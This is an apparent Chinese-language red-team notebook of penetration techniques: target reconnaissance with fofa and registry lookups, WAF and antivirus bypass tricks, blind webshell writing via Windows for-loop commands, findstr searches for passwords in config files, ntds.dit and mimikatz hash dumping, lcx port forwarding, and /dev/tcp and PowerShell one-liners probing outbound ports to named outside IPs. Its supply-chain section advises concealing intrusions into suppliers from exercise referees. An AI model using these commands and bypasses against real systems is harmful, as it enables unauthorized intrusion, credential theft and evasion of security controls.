<a name="s556G"></a>
## 信息收集流程
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1656582665228-b55cd059-b10f-43e5-aa14-e8ebf83f58f5.png#clientId=ud759b4de-ca2d-4&from=paste&height=469&id=u42e2d174&originHeight=586&originWidth=1372&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46131&status=done&style=none&taskId=u2f8f6ec2-10c7-41e8-a5ce-326396bc297&title=&width=1097.6)<br />           **                                   ↓**<br />![](https://cdn.nlark.com/yuque/0/2022/jpeg/1345801/1656582648954-6c408dc1-5e66-4be3-b1bf-e148c3ee351d.jpeg)


我常用的工具<br />未完待续...<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1662307300309-9ee5fac1-f42d-42c4-bc84-f9ef300e8e3d.png#clientId=u289a12b1-5f20-4&from=paste&height=391&id=ua56a01a6&originHeight=489&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50326&status=done&style=none&taskId=uc29e127b-46fc-4462-ab97-62043438efc&title=&width=638.4)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1662307131363-9ade4a16-c8f1-4238-9380-679e2995b14b.png#clientId=u289a12b1-5f20-4&from=paste&height=534&id=u47613f76&originHeight=668&originWidth=1481&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95648&status=done&style=none&taskId=ud292bb37-3265-421e-8fef-c05d8d97f84&title=&width=1184.8)<br />但是内网不建议一上来就fscan，fscan虽然好用，但是内置的poc模块如永恒之蓝、S2等大多会触发内网设备告警。

webalive 批量指纹识别和网站探测存活<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618154800370-40665f89-59d1-466d-bbc4-4d2e08535209.png#height=363&id=tLZ5I&originHeight=725&originWidth=1236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=239774&status=done&style=none&title=&width=618)<br />类似的还有Finger<br />Github地址:[https://github.com/EASY233/Finger](https://github.com/EASY233/Finger)

----------------------------------------------------------------------

内网ip地址<br />A类地址：10.0.0.0--10.255.255.255<br />B类地址：172.16.0.0--172.31.255.255 <br />C类地址：192.168.0.0--192.168.255.255

<a name="ynOSn"></a>
## rad主动爬虫爬取页面路径
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1662307800183-3595cad7-2c77-4f08-8917-a3fecad95dea.png#clientId=u6a601426-7b11-4&from=paste&height=678&id=u97513506&originHeight=848&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=140773&status=done&style=none&taskId=ufbf5fe08-723c-4180-a103-b270f9e7f98&title=&width=666.4)
<a name="o1VrK"></a>

## burpsuit
全站sql注入，本身数据包是get类型不存在，改成post也不存在，然后post使用change body encoding变成multipart格式，可能就存在sql注入，比如这种情况pot的简单字段，改成json就存在了fastjson反序列化，99%数据包都不存在fastjson漏洞，但是刚好有一个数据包修改了就存在。这种情况一般需要修改了数据包格式以后和修改前对服务器交互后的响应包是一样的基本可以参数漏洞<br />get → post →xml、json<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612614834099-7ce79eee-1b7d-4b6f-b465-817e9fb96abd.png#height=453&id=EXfVu&originHeight=604&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71742&status=done&style=none&title=&width=470)

<a name="ejpM0"></a>
## github语法
[https://github.com/search?q="域名"](https://github.com/search?q=%22shenhua.cc%22) mysql password&type=Code<br />[https://github.com/search?q=](https://github.com/search?q=%22ehang.com%22)"域名"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615883761570-bae0413d-5191-443a-9833-2d56eaed8b35.png#height=275&id=rEiya&originHeight=550&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42908&status=done&style=none&title=&width=455.5)
<a name="J3a3D"></a>
## 绕CDN
现在的cdn技术很成熟了，很难绕得开，以前用外国服务器ping一下就出来了，现在域名也会部署上云waf<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615877790930-3c222a57-768e-4315-90d6-fd8419040edc.png#height=92&id=M2d4x&originHeight=123&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11580&status=done&style=none&title=&width=530)<br />但是技巧还是有的，fofa是永远的神<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615877823244-e3989703-8e0d-491b-98f8-4b8203fa0248.png#height=406&id=Jotv4&originHeight=812&originWidth=996&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97045&status=done&style=none&title=&width=498)
<a name="1Zlpl"></a>
## 绕waf
1、参数污染造成漏洞或者绕过waf（遇到过绕过上传类型的实列)<br />再目标id字段前面添加一个空字段或者再前面本身存在没有影响的字段的内容无限扩充字符。或者尽量无限创建无效的字段。例如:<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615002661577-0503a7c0-bb88-4fc6-9fe3-ec46e77c71e9.png#height=286&id=yl11A&originHeight=571&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27044&status=done&style=none&title=&width=267)<br />2、<br />在"boundary="和"----"中间插入tab键。
```
Content-Type: multipart/form-data; boundary=----adiwbfibfbsfbjifbqweiocoibca
```
↓
```
Content-Type: multipart/form-data; boundary=    ----adiwbfibfbsfbjifbqweiocoibca
```
3、绕过安恒云防护，使用双文件名可绕<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615003076464-8d9ea60a-f032-41b2-b618-9e1fdb95e8a6.png#height=215&id=PN4li&originHeight=430&originWidth=1225&originalType=binary&ratio=1&rotation=0&showTitle=false&size=217234&status=done&style=none&title=&width=612.5)<br />4、修改HTTP/1.1→HTTP/2.0→HTTP/0.8→HTTP/1.0
<a name="Sv3rz"></a>
## 二维码
有时候厂家会提供二维码登陆的情况，可以把二维码解析成url的形式，发送给别人点击从而劫持别人账户登陆凭证，如果没有做其他防护如:点击确认，等其他操作就是存在漏洞。

[https://cli.im/deqr/](https://cli.im/deqr/)

<a name="jYzzx"></a>
## GOBY
输入域名后会有批量ip，然后导入goby扫描，但是要确定是否属于资产ip

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614440686249-1dd8e42f-0bfe-4130-93a0-84ad615ef870.png#height=286&id=cRI2F&originHeight=571&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44927&status=done&style=none&title=&width=313.5)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614440800255-cab98164-5907-46d9-b002-e79af88597b5.png#height=505&id=Csu6p&originHeight=1010&originWidth=1314&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99017&status=done&style=none&title=&width=657)
<a name="Xb8ji"></a>

## 苹果手机
越狱的苹果手机如果开放22端口 默认账户密码是 root alpine

<a name="ytRkl"></a>

## 搜索后台
bing<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614612050413-2a06d59d-3b93-4166-b9be-82741529c115.png#height=454&id=FnnTy&originHeight=908&originWidth=1074&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106748&status=done&style=none&title=&width=537)

<a name="nzbbt"></a>
## 搜索敏感信息
[https://www.lingfengyun.com/](https://www.lingfengyun.com/)  零风云<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1662307939418-588b621f-abe6-4adb-97fb-3c2d0924e9b8.png#clientId=u6a601426-7b11-4&from=paste&height=710&id=u08652fc2&originHeight=887&originWidth=1388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=136194&status=done&style=none&taskId=u588819c8-70b0-4975-b2da-fb96838ff15&title=&width=1110.4)<br />[https://otx.alienvault.com/indicator/domain/csg.cn](https://otx.alienvault.com/indicator/domain/csg.cn)  
<a name="a4n8o"></a>
## 寻找边缘资产
<a name="oiWLM"></a>
### SecurityTrails+webalive+(CDN筛查脚本)或者Eeyes

类似的秒出子域名网站：<br />[https://www.virustotal.com/gui/domain/baidu.com.cn/relations](https://www.virustotal.com/gui/domain/www.getholdings.com.cn/relations)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620971176900-1f5723f7-e2ae-4560-ad63-dfcad28bda09.png#height=310&id=SIArJ&originHeight=619&originWidth=990&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85972&status=done&style=none&title=&width=495)

一秒出子域名+webaivle进行资产存活探测<br />[https://securitytrails.com/list/apex_domain/](https://securitytrails.com/list/apex_domain/)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618223773147-a0f3fb4e-52b5-401e-b3e7-d341c650a33b.png#height=479&id=bs93U&originHeight=958&originWidth=1473&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127753&status=done&style=none&title=&width=736.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1618223882207-26906a4e-ec5f-469e-8b17-6c81547965cc.png#height=436&id=AbayH&originHeight=871&originWidth=1499&originalType=binary&ratio=1&rotation=0&showTitle=false&size=325044&status=done&style=none&title=&width=749.5)

[https://www.yuque.com/aufeng/aufeng_good/ggndww](https://www.yuque.com/aufeng/aufeng_good/ggndww) 自己写的CDN筛查脚本，比较好用。用了队列+多线程，速度很快很稳。但是基于nslookup，或许准确性稍微低了点。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620389374033-7a7f8099-ab7d-49cf-a397-f76c4be2e1d9.png#height=513&id=raHMi&originHeight=684&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=402104&status=done&style=none&title=&width=657)

[https://github.com/EdgeSecurityTeam/Eeyes](https://github.com/EdgeSecurityTeam/Eeyes) 是一个CDN筛查脚本<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620232710534-8d14cfb1-f6d2-4f11-b20d-4eb8bf3ee852.png#height=205&id=YEITN&originHeight=410&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44241&status=done&style=none&title=&width=600.5)
<a name="akr9f"></a>
### 公众号、app入手
[https://weixin.sogou.com](https://weixin.sogou.com)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614046049658-b4f0dc2d-4082-48f3-b34d-efdd7ba35884.png#height=426&id=AlAPk&originHeight=851&originWidth=883&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108774&status=done&style=none&title=&width=441.5)<br />[https://www.qimai.cn/ ](https://www.qimai.cn/)七麦，找app<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615438719228-533f7705-b5b3-43cf-ae8a-8c361bac4ed6.png#height=450&id=ZlcYq&originHeight=899&originWidth=1376&originalType=binary&ratio=1&rotation=0&showTitle=false&size=193190&status=done&style=none&title=&width=688)
<a name="nzEVu"></a>
### fofa+goby

例如"版权所有@深圳平安通信科技有限公司"字眼的网站<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614614235070-736fe882-f019-45ac-9c8e-19fc81f07624.png#height=234&id=mVVJf&originHeight=468&originWidth=1274&originalType=binary&ratio=1&rotation=0&showTitle=false&size=885153&status=done&style=none&title=&width=637)<br />fofa中有body就ok了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614614326189-a143aede-9176-4a3f-a649-3b194904d76c.png#height=408&id=me7Pt&originHeight=815&originWidth=984&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82740&status=done&style=none&title=&width=492)<br />偶尔body不好用

可以选择fofa搜索 :<br />例如浙江省农商  title="农商" && region="Zhejiang"<br />例如广州市地铁  title="地铁" && city="Guangzhou"<br />能搜出来很多资产。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615446291671-13c23e65-4f88-45c3-8f3b-7c0dbbd513f9.png#height=425&id=iqJGv&originHeight=849&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64604&status=done&style=none&title=&width=515.5)<br />找大佬借个fofa会员，然后把csv文本的ip导出来<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615446322837-15842a00-8402-407f-800e-731ac83c69c4.png#height=285&id=QOUxz&originHeight=569&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143891&status=done&style=none&title=&width=475.5)<br />利用notepad把端口快速去重<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615446354851-6b3a7476-2eb6-4af1-a906-148060c6fec2.png#height=350&id=BZDkx&originHeight=700&originWidth=1151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49619&status=done&style=none&title=&width=575.5)<br />然后扔进去goby<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615446379135-9b7fe131-39f3-48dd-a3ee-6bd7c0444bf6.png#height=350&id=y6gt6&originHeight=700&originWidth=1174&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56768&status=done&style=none&title=&width=587)

<a name="gVbP4"></a>
### 天眼查+企信通(便宜、好用)
有时候打大型企业，直接正面刚是不行的，要么供应链攻击(不会)，<br />要么就打下属公司然后内网摸靶标。使用天眼查查找控股百分之100的下属公司。然后从对应的下属公司中快速找到对应的域名。找到域名之后，迅速判断是否存在CDN，把真实ip找出来，然后再全端口扫描，还突破不了，就C段爆。<br />总得来说，还是域名→真实ip→全端口→C段<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615563590932-7efceb93-f9fd-4b48-8f68-e4e26dc3c1c0.png#height=417&id=nLfM7&originHeight=834&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97330&status=done&style=none&title=&width=503)<br />快速定位弱点。

<a name="7tOSq"></a>
### 如何快速定位集团下属资产的app
天眼查中的软件著作权<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615995265951-49a8b22e-b35d-4889-8bcc-5ff2586e6e4a.png#height=379&id=akmqq&originHeight=505&originWidth=925&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48405&status=done&style=none&title=&width=694)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615995291372-54c98db6-e6a3-4a03-a631-55dab8d3fd71.png#height=436&id=BQunS&originHeight=871&originWidth=1590&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99233&status=done&style=none&title=&width=795)

<a name="Ij9uB"></a>
### 通过ICP备案查询
寻找该单位备案的其它网站<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617199266113-9995431d-a2f2-49f9-8e79-5b5fd1de1a1b.png#height=390&id=W2sBv&originHeight=779&originWidth=1505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102388&status=done&style=none&title=&width=752.5)<br />天眼查备案号查询需要钱了，可以用政府的

[https://beian.miit.gov.cn/#/Integrated/recordQuery](https://beian.miit.gov.cn/#/Integrated/recordQuery)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619339439796-7c12815c-dc53-4d99-9241-1cdd977145cb.png#height=269&id=NVeFi&originHeight=538&originWidth=1343&originalType=binary&ratio=1&rotation=0&showTitle=false&size=266691&status=done&style=none&title=&width=671.5)<br />[https://beian.tianyancha.com/](https://beian.tianyancha.com/)<br />天眼查查备案<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620567000280-48f07371-4b84-4c6b-a151-4787a423de89.png#height=336&id=oe5FE&originHeight=671&originWidth=1383&originalType=binary&ratio=1&rotation=0&showTitle=false&size=286088&status=done&style=none&title=&width=691.5)

<a name="O5wNZ"></a>
### 注册机构反查
[http://whois.chinaz.com/reverse?ddlSearchMode=2](http://whois.chinaz.com/reverse?ddlSearchMode=2)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1631854514737-293c3102-f718-42d5-b7c5-c26d66b07a03.png#clientId=ua29016c5-f42c-4&from=paste&height=279&id=ua630b65e&originHeight=558&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59854&status=done&style=none&taskId=uf005f578-973c-4cef-a461-32b397d9aa2&title=&width=634.5)
<a name="rV31q"></a>
### 子域名fuzz
比如说baidu.com域名 子域名爆破出来之后test.baidu.com ，那么test和baidu.com之间可以尝试fuzz一下子域名，可以使用github的fuzzdomain工具。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1630636957955-e49580f7-37b3-4baa-9a09-29d77eb7e849.png#clientId=uf12d5603-3d1c-4&from=paste&height=360&id=u8c2dd20a&originHeight=480&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39064&status=done&style=none&taskId=uf7e47fc7-f803-4b89-afd9-b4296deda01&title=&width=683)

<a name="A8qLB"></a>
## 快速打点
Nimscan+小米范<br />Nimscan缺点:1、不能在linux上使用，会报错，我估计是Nim的兼容性问题，论兼容性还是go强<br />2、端口扫出来后还需要处理成  10.xxx.xxx.xxx:端口 形式 (notepad直接快速处理)<br />3、需要好的网络，不然丢包严重。所以最好放windows的vps上跑。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614842097992-05673edf-cc9b-483b-91d9-388afebb4665.png#height=331&id=urylf&originHeight=662&originWidth=1147&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39486&status=done&style=none&title=&width=573.5)<br />全端口扫描txport工具不错<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1624254001120-86f51bd7-51f0-4dc0-a7ab-afe821fd20d5.png#height=278&id=x1uP4&originHeight=556&originWidth=1507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110691&status=done&style=none&title=&width=753.5)

小米范<br />快速打点，全端口看页面，但是如果有SSL证书的页面，需要点击浏览器才能直观<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614842261172-6b893c09-5c67-4d76-a985-c7e9413495b5.png#height=274&id=kpQqr&originHeight=547&originWidth=1018&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33469&status=done&style=none&title=&width=509)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614842283600-17f6d7a4-11e6-4974-8697-a60a35807796.png#height=429&id=cQ0p6&originHeight=858&originWidth=1369&originalType=binary&ratio=1&rotation=0&showTitle=false&size=313796&status=done&style=none&title=&width=684.5)

[https://github.com/lc/gau/releases/tag/v1.2.0](https://github.com/lc/gau/releases/tag/v1.2.0) 匹配一些接口和路径<br />gau.exe<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1629694835785-bf28e3b7-4d59-443d-8d4c-3b4839bf28c6.png#height=701&id=ntRs7&originHeight=934&originWidth=821&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127708&status=done&style=none&title=&width=616)
<a name="gwik7"></a>
## 无回显写入webshell
<a name="AJFYJ"></a>

### windows
有时候碰到一些命令执行的漏洞，通过dns回显证明出来存在，这种情况如何写入webshell进行权限维持。

使用dir命令、for do命令<br />dir /s /b D:\login.php |findstr "DVWA"<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615011524456-97811179-54a9-4985-9807-77a59951cc5c.png#height=151&id=x27iw&originHeight=202&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14386&status=done&style=none&title=&width=608)<br />在DVWA目录下是可以解析php文件的，所以要想办法写入。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615011691474-c7154846-989d-4ccc-be84-ce84b36dfaa5.png#height=157&id=P60dw&originHeight=210&originWidth=967&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29627&status=done&style=none&title=&width=725)<br />定位到login_logo.png文件，在该返回的前两层目录写入，需要跳三次。这个方法很暴力，匹配到的路径前两层都会写入文件<br />for /f %i in ('dir /s /b D:\login_logo.png') do (echo "aufeng" > %i\..\..\..\aufeng.php)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615012092687-7b4c5aa5-2d3f-4727-aaa9-d14f7421e415.png#height=248&id=jAUFf&originHeight=496&originWidth=1210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54878&status=done&style=none&title=&width=605)<br />最后算是写成功了，但是不怎么提倡。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615012116262-936e6b92-1a45-4872-aaa6-7ad06f80a0fd.png#height=156&id=lExjq&originHeight=208&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11526&status=done&style=none&title=&width=602)

dir /b/s config.*     //查看所在目录所有config.为前缀的文件<br />findstr /si password *.xml *.ini *.txt  //查看后缀名文件中含有password关键字的文件<br />findstr /si login *.xml *.ini *.txt  //查看后缀名文件中含有login关键字的文件
<a name="mY5fF"></a>
### linux
find / -name 111.txt |while read f;do sh -c 'id;pwd;ifconfig' >$(dirname $f)/test.txt;done
<a name="y8HIZ"></a>
## web中fuzz的字典
字典很好用。尤其是有的后台可以爆破，但是又规定了有大小写字母和特殊符号，这个时候需要生成字典。下面这个脚本就很不错。还有一些xss、文件包含的一些fuzz字典，很棒。

[https://github.com/TheKingOfDuck/fuzzDicts/tree/master/passwordDict/RW_Password](https://github.com/TheKingOfDuck/fuzzDicts/tree/master/passwordDict/RW_Password)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615652974095-eefdd01a-b207-46c8-82ce-b6898edfed5b.png#height=359&id=QeHV7&originHeight=718&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69067&status=done&style=none&title=&width=579)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615653345460-c674ca42-de59-4802-9667-6ad36dd01d9f.png#height=505&id=RpCsF&originHeight=673&originWidth=828&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33799&status=done&style=none&title=&width=621)

<a name="WSrOd"></a>
## Copy net1添加账户绕火绒
![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893413-9f39a1aa-53d6-424a-85c8-134587ac3359.png#height=362&id=XbgiW&originHeight=852&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=341)
<a name="lfzK6"></a>
## 供应链攻击
供应链攻击分享笔记：1、供应商提供的信息可能适合定位靶标位置和获取靶标权限。2、怎么找供应商？<br />（1）招投标网站查询靶标信息或者目标单位信息，确定系统建设方。<br />（2）靶标或者目标单位，网站最底部，一般有“xxxx公司提供技术支持”。<br />（3）有些官网自带招投标信息。3、一些供应商提供固定行业的系统建设，一套代码多处使用，所以可能存在口令复用问题。4、思路之一：尝试找生产系统的测试系统，测试系统一般是供应商搞的，可能存在数据库数据复用问题。5、搞供应商内网的邮箱(运维\IT\驻场)、论坛、OA是重点，这些敏感信息多。6、忠告：不推荐大家，看一个攻击目标就只想着供应链。供应链只是一种可能存在的攻击途径，主要是辅助我们对目标进行渗透。而且在搞供应链的时候一定要有目的性，寻找网络连通的可能性，而不是乱打一气。毕竟在证明网络可连通之前，是没有授权的，公安没法保你的。7、保护自己：没拿到靶标相关的东西前，先不要和裁判说入侵了xx供应商，注意隐蔽自己，即使在供应商那里没找到有用信息，就当无事发生。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893836-e1c373b0-0c49-495b-8cd4-10ccfd635e01.png#height=444&id=gBmtW&originHeight=592&originWidth=1098&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=824)
<a name="ccvja"></a>
## 
<a name="4kwxW"></a>
## Proxifier(代理技巧以及多层代理)
代理整个C段<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400894424-cc5bb1db-3171-476e-aee0-4dff3a66f3c6.png#height=351&id=Pu4vH&originHeight=523&originWidth=619&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415)

多级代理<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611654971644-158e02e5-1ceb-4130-b5b1-88911c465438.png#height=442&id=yydPF&originHeight=589&originWidth=592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147443&status=done&style=none&title=&width=444)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611655001700-67999aae-3bc9-491f-afcb-eb2a72773a54.png#height=287&id=IDT3R&originHeight=382&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=173281&status=done&style=none&title=&width=264)<br />[https://mp.weixin.qq.com/s/Wjv6dULS6Wwyg4N8-ZmHng](https://mp.weixin.qq.com/s/Wjv6dULS6Wwyg4N8-ZmHng)

--------------------------------------------------------------------------------<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629406269-f85bbcc5-a9d7-4243-a6c9-16542bdf66f1.png#height=334&id=BfE76&originHeight=446&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186269&status=done&style=none&title=&width=677)<br />1中出网，和vps服务器作上代理，这个时候，攻击机器可以访问2<br />2不出网，可以继续建立多层代理。让攻击机访问到3<br />添加如下代理链<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629438953-d37fab86-ff58-4559-9ceb-6a3fb0b117c6.png#height=454&id=tRHo8&originHeight=605&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99933&status=done&style=none&title=&width=436)<br />这个时候，会多出一个chain就能走上代理了。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629555289-de6f9eaa-9880-4376-95ac-bcfcfdd6b17e.png#height=236&id=SGLtg&originHeight=315&originWidth=757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16614&status=done&style=none&title=&width=568)

linux的话，需要修改一下proxychain，比如箭头所指的dynamic_chain要去掉注释符。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629627077-673b51d4-9cde-4abb-afbb-d065bfe3ab1c.png#height=332&id=O93G4&originHeight=443&originWidth=484&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100868&status=done&style=none&title=&width=363)


<a name="6EHu3"></a>
## 关于EDR

域控就是域管理员，但是域控似乎不存在本地管理员

ntds.dit(域控环境)是为了可以获取域内所有的hash值  ，获取域内所有的hash值就有域内所有用户的登陆hash或者邮箱hash<br />ntds.dit拉到本地，然后本地抓起来，  如果电脑没有深信服edr啥的,mimikatz可以直接本地抓<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611461765647-f9a72f9e-d523-4d7f-9b6f-b82378253661.png#height=319&id=yTbPe&originHeight=425&originWidth=780&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109556&status=done&style=none&title=&width=585)

<a name="EnMEs"></a>
## 关于NC的报错
nc -lvp <br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614229953887-cefa8a24-e103-4567-8bd2-6d79d5327a2e.png#height=67&id=wHKxU&originHeight=89&originWidth=549&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5278&status=done&style=none&title=&width=412)<br />如果有这个报错，直接加个n就可以<br />nc -lnvp
<a name="xmb3p"></a>
## 关于内网3389
有时候内网没有3389，但是cs上线了，权限也很高，命令行开启了内网3389端口的时候，netstat都看到了3389，就是还是连不上，或者说内网某些网段做了限制策略不允许访问。这个时候可以选择一下端口转发。<br />例如:<br />条件:3389防火墙做了限制无法访问，转到53端口。<br />lcx.exe -tran 53 192.168.222.137 3389
<a name="MBCYm"></a>
### 查看更改后的RDP端口(3389变更后的端口)
如何查看被改后3389的端口<br />执行命令 tasklist /svc | find "Ter"，本例中查看到 TermService 的 PID 是 1592。<br />执行命令 netstat -ano | find "1592"，查看 TermService 使用的端口，如示例中的 3389。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893159-1fd1ed3e-2d52-4f12-b962-8b8970006029.png#height=85&id=LREiZ&originHeight=162&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415)
<a name="fcJcK"></a>
## 不出网的情况，使用出网的端口上线CS，或者做代理
**防火墙的出站规则:是指管理员允许电脑能访问外网服务器的什么端口。也可以是电脑哪些端口可以访问外网。**<br /> 出站就是你访问外网 入站就是外网访问你  <br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615613315611-4e13b54f-e0bb-4f72-afc1-0b24aa082ada.png#height=342&id=OBFxs&originHeight=683&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62482&status=done&style=none&title=&width=455)<br />入口webshell的机子不出网，不出网分几种情况<br />1：协议出网，比如:icmp ping不通百度，curl不通http，但是dns可以解析<br />2: 端口出网<br />linux命令下，使用下面命令探测端口出网。
```
for i in {21,22,23,25,53，80,88,110,137,138,139,123,143,389,443,445,161,1521,3306,3389,6379,7001,7002,8000,8001,8080,8090,9000,9090,11211};do timeout 0.5 bash -c "echo >/dev/tcp/101.36.104.49/$i" && echo "$i ************************open************************" || echo "$i closed";done
```
windows命令下
```
powershell -c "21,22,80,137,161,443,445,1900,3306,3389,5353,8080 | %{try {(new-object Net.Sockets.TcpClient).Connect('106.55.62.131',$_);Write-Host "$_ open"} catch {Write-Host "$_ closed"} finally {} }"|findstr /I open
```
这个时候，即使协议不出网，但是tcp通信还在的话，找到出网端口进行socks代理，或者上线CS也是没问题的

<a name="QN4YO"></a>
## 内网渗透快速定位域所处位置、域控
<a name="acM0f"></a>
### 定位域控
